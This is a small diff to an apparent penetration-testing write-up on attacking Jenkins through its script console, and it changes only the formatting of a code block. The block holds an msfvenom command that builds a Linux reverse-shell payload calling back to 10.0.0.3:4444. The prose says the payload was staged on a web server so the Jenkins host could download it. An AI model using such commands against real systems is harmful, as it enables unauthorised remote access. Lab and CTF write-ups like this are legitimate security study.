@@ -15,8 +15,8 @@ The general method is outlined in the [documentation for the script](https://git
 On my most recent encounter with this, the `jenkins_script_console` module refused to work for some reason.
 
 Instead of using the typical `jenkins_script_console` script, instead I prepared a reverse shell payload myself, using Metasploit's `msfvenom`.
-```shell
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.3 LPORT=4444 -f elf -o /tmp/payload.bin
+```console?prompt=$,#
+$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.3 LPORT=4444 -f elf -o /tmp/payload.bin
 ```
 
 I then uploaded payload.bin to my web-server, to be downloaded later on on the Jenkins server.
